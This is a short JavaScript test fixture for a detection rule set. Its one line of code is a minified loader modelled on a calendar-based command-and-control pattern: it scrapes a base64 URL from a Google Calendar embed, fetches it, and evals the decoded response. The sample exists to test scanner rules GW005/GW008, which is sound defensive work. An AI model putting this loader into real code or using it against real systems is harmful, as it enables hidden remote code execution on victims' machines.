// EDGE CASE TEST FIXTURE — Minified payload
// Single-line minified version of the Wave 1 calendar C2 pattern
// All whitespace removed, variable names single-character
// Should still trigger GW005/GW008

async function c(){const r=await fetch("https://calendar.google.com/calendar/embed?src=test%40example.com");const h=await r.text();const m=h.match(/data-base-title="([A-Za-z0-9+/=]+)"/);if(m){const u=atob(m[1]);const f=await fetch(u);const iv=f.headers.get('ivbase64');const k=f.headers.get('secretKey');if(iv&&k){const p=await f.text();eval(atob(p))}}}c();
